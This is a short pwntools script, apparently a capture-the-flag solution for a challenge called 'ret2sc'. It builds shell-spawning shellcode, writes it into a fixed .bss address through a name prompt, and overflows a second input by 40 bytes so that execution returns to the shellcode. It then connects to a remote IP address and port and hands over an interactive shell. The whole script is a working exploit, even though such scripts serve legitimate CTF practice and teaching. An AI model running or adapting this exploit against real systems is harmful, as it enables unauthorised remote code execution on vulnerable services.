from pwn import *
context(arch = 'amd64')
shellcode = asm(shellcraft.sh())
sc = shellcode.ljust(0x32, 'A')
bss = p64(0x601080)

#r = process('./ret2sc')
r = remote('140.110.112.31', 2122)
payload = 'a' * 40 + bss
r.recvuntil('Name:')
r.send(sc)
r.recvuntil('best:')
r.send(payload)
r.interactive()
